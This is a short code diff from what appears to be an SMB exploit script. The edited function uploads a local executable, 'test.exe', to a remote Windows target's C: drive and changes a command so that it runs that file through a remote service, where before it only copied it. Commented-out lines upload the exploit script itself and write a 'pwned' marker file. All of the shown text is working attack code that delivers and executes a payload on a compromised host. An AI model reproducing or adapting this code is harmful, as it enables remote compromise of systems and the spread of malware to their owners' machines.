@@ -978,7 +978,7 @@ def smb_pwn(conn, arch):
 	smbConn.closeFile(tid2, fid2)
 	smbConn.disconnectTree(tid2)
 	smb_send_file(smbConn, '/opt/WEB/tomcat8080/webapps/vnptweb/upload/images/t/test.exe', 'C', '/test.exe')
-	service_exec(conn, r'cmd /c copy c:\\test.exe')
+	service_exec(conn, r'cmd /c c:\\test.exe')
 
 	#smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
 	#service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt')
